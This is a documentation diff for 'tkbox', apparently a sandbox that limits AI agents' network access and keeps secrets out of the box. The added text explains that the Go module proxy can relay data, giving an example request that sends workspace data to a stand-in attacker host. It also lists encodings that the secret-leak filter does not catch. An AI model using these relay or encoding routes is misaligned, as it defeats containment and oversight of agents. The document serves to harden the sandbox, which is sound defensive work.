@@ -95,11 +95,18 @@ Presets:
 | `claude-code` | `api.anthropic.com`, `statsig.anthropic.com` | Claude Code (set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` so it does not try other telemetry hosts) |
 | `apt-ubuntu` | `archive.ubuntu.com`, `security.ubuntu.com`, `ports.ubuntu.com` | `apt-get` on Ubuntu images (plain HTTP) |
 | `debian` | `deb.debian.org`, `security.debian.org` | `apt-get` on Debian images, such as `python:3.12-slim` |
-| `go-proxy` | `proxy.golang.org`, `sum.golang.org` | Go modules through the module proxy (`GOPROXY=direct` needs the VCS hosts as well) |
+| `go-proxy` | `proxy.golang.org`, `sum.golang.org` | Go modules through the module proxy (`GOPROXY=direct` needs the VCS hosts as well). Both fetch on the guest's behalf from the host a module path names, so the agent can relay workspace data to a domain it picks (see below) |
+
+Presets and hosts that fetch on the caller's behalf (the Go module proxy and checksum database, any URL-fetching
+service) relay data: `GET https://proxy.golang.org/evil.example/<data>/@v/list` makes the mirror contact
+`evil.example`. What can leave that way is workspace data the agent can read, not secret values, which never enter the
+box. Leave such entries out of boxes whose workspace must not leave ([limits.md](limits.md#network)).
 
 A host that is not allowed is not refused outright: the connection waits up to 2 minutes (the daemon's
-`--approval-timeout`) for a person on the host to run `tkbox approve <id>`, except with `inspect: all`, which refuses it
+`--approval-timeout`) for a person on the host to run `tkbox approve <id>`, except with `inspect: all`, which refuses it (and a port the allowlist does not name for the host)
 at once. Loopback, private, link-local, metadata and this host's own addresses are refused whatever the allowlist says.
+On a cloud VM the host's public IP is NAT'd and on no interface: start the daemon with `--egress-block <public IP>/32`
+so it is refused too ([cli.md](cli.md#tkbox-daemon)).
 
 ### Secrets
 
@@ -126,8 +133,8 @@ Inside the box, `$NAME` holds a placeholder such as `tkbox_GH_3f9c…`, never th
 the value (`Authorization: Bearer $GH`); on a request to one of `hosts`, the host proxy replaces the placeholder in the
 bound header with the real value. A request that carries the placeholder anywhere else (another header, the URL, the
 body) or to any other host whose traffic the proxy reads is blocked and recorded as `tkbox.secret.leak`. On those
-connections the proxy also blocks the real value itself (raw, base64, percent- or JSON-escaped) wherever it is not
-being swapped in, and redacts it from response headers, bodies and trailers. Requests to bound hosts are sent with
+connections the proxy also blocks the real value itself (raw, percent-encoded, JSON-escaped, hex or base64, in any case) wherever it is not
+being swapped in, and redacts those forms from response headers, bodies and trailers; other encodings (HTML character references, a value split across lines) are not caught, see [limits.md](limits.md#secrets). Requests to bound hosts are sent with
 `Accept-Encoding: identity`, so their responses can be checked. The value is resolved by the CLI, sent to the daemon over its socket and
 never written to the box, its disks, its events or the record.
 
